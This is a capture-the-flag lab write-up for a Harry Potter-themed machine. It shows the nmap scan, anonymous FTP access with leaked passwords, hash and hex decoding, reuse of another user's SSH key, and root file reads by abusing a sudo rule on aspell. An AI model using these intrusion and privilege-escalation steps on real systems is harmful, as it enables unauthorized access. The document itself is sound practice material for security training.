# Yer a Wizard

## 1. Intel

Scan the target with nmap:

`
nmap -sC -sV <ip>
`

**Output:**

```

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.8.0.202
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel`

```

## 2. Connect

Since we can see a ftp service, we connect to it:

`
ftp {ip}
`

## 3. Explore

We see two things:

    - a .hidden file
    - a directory named "..."

We take a look at the file:

`cat .hidden`

**Output:**

`I swear that my password is Il0veTheMalefoys, trust me, I'm Hagrid, I never lie!
81 bytes transferred`

We `cd` in the dir and find another file:

`cat .reallyHidden`

**Output:**

`FINE! My password is IAlreadySaidTooMuch `



## 4. Login

Since we potentially have an username and password , we can try to log in the machine with ssh

`ssh hagrid@{ip}` 

`password : IAlreadySaidTooMuch`

## 5. Explore

There is a riddle.txt in the root, that cannot be read

```
ls -la riddle.txt
```

**Output:**
```
---------- 1 hagrid hagrid 2097 Jul 23 13:42 /home/hagrid/riddle.txt
```

Since it is owned by hagrid, we can change the perms

```
chmod 644 riddle.txt && cat riddle.txt
```

**Output:**

```
Professor dumbledore gave me this riddle, but I don't think I can decipher this.
He said "take a crack at it, would you?" which is odd for him to say, I guess? 

e1f22cea2a1c41f047b36b505a6aede84a848209c69505ac17ffdaebd7ba63c98e69f68f755134d7b94d47d0c86c1aea72f39fa4e89457cf8b25f19cd1b2dd33

3984d0b5033258950d886bc760a867399e57d8cc396c74beeaefc51168ccc7d11369e882d2e591619c42192102d550fdebb59db528f88bb46cc1a33a30b0ec0a

1f4be9bd3c61e621ef43bb2e0a2d7836786f730e4e0e6aa546899bceab0571904dfc6efc94c1324b1a22ae446f0a995b533054b1dbd09d0cda03e0985786d59a

c9f4875d9269814e2ddf825ce769cb77702034225818d8cad8d46c6483693fa28b8d4e3e053d1facbd774b1fc5a2b4cc31ef41a1129e58fc149d383dc2f1b647

e75baca2466b6805bdcfc52a12160ffaaf05677dd947c5b3019710d43ea18010fcb6c9ec0cde94efcb23a68bf9c7595798e77f4ff0602f468377d15392465b69

de6bcbd90ff00c604a836fe2a0959c6a86aeabd440d8982970613edff3cd27996cd4a21c005e4dd4dca89c9a5d7a46fa9d97d2b220521dddf3b376fd04f2d0ba

7afc42427607f5171b9db17b38c3953ad5e614955cedbba9cfb97a276f3f3bd83fcfe61bdbfc799ca83865e446f3ae47998a624fd7316e7e56f7b27c9d67f150

263adce0f04ee1eb3e75528ed5251724906bdd44c4265a1cd1185af010a4561e153833d1ea46df69764f2ece8e33199f8d787bf39cc51ebb406f15480c7e780e

7f5a8bf8b1779e4802c8e86dd1ea8e096be633d64eb8b5610ae9267af670734de1bf740427d05d454f5d4080aedf2b0821c1f338cd507e9b0dc9a0145bbff303

806b977f3edfeda024f63584cc232c7b53ca0bba09cf9818346070f6489e775232f19d33390a78ba14f301a41a0c6994c2f7d95be6f6faeff9243f8e38c131f7

1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75

c9f4875d9269814e2ddf825ce769cb77702034225818d8cad8d46c6483693fa28b8d4e3e053d1facbd774b1fc5a2b4cc31ef41a1129e58fc149d383dc2f1b647

b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86

496e20666163742c2074686973207761732073696d706c652c207472756c792c207468652070617373776f72642069732042794d65726c696e4265617264210a

62c065cf9a4a607e163d6aaa3c63a7a8462fe0679e7293db4115b051ff312165016962371d746c00cbcdb3cabd5ad8b4f987a974e9e457010d68b41193139b7b
```

These are all encoded, we got work to do.

These are all SHA-512 except the last one, it is hex-encoded ASCII text

Decoding it gives : 

**Output:**

```
In fact, this was simple, truly, the password is ByMerlinBeard!
```

## 6. Connect

We can now connect to dumbledore

```
ssh dumbledore@<ip>
```

In /home we see a /harry folder

Running : 

```
cat /etc/sudoers.d/harry
```

**Output:**

```
harry ALL=(root) NOPASSWD: /usr/bin/aspell
```

We can try to find common files in the harry user folder such as .profile .bashrc or dirs like .ssh

After trial and error , we find a .ssh file with harry's private ssh key

We can now connect into Harry's machine, we just need to copy he's key and `chmod 600` it.

```
ssh -i path/file harry@<ip>
```

## Exploit 

We search a `root.txt` , we can assume it is located in the root

We know from previous intel that Harry has sudo perms on aspell

Aspell is a tool used to check spelling in text files

```
sudo aspell -c /root/root.txt
```

**Output:**

```

```

Nothing shows up, yet no error, the file must exists

```
sudo aspell --config /root/root.txt
```

**Output:**

```
Error: /root/root.txt:1: The key "53565a4a52564d324d315648546b56474e6a564455303957533064525746705353314a5156454e4f537a6448556c425555553161565539574d6b5244576c4e57536c4a5156456b7a5530564d4e544a45527a5255553064464e45565a5454493354314a5652454d7a556c705156555a425054303950513d3d" is unknown.
```
Now that we have an encoded string we decode it and get the flag.





